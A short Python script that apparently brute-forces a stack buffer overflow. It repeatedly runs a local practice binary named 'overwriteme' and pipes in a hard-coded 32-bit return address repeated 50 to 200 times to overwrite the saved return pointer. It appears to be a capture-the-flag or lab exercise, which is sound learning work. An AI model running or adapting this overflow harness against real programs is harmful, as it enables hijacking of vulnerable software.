#!/usr/bin/python3
from subprocess import Popen, PIPE, STDOUT
import time



def stdinInput(path,payload):
    #print("Sending",payload)
    try:
        p = Popen([path], stdout=PIPE, stdin=PIPE, stderr=PIPE)
        stdout_data = p.communicate(bytes(payload,'utf-8'),timeout=3)[0]
        print(stdout_data)
        
    except Exception as e:
        print("Unable to communicate with the process")
        print(e)
    


def main():
    path = '/home/austin/Desktop/overwriteme'
    payload = "\x8b\x87\x04\x08"
    for i in range(50,201):
        print(i)
        stdinInput(path,payload*i)

if __name__ == '__main__':
    main()
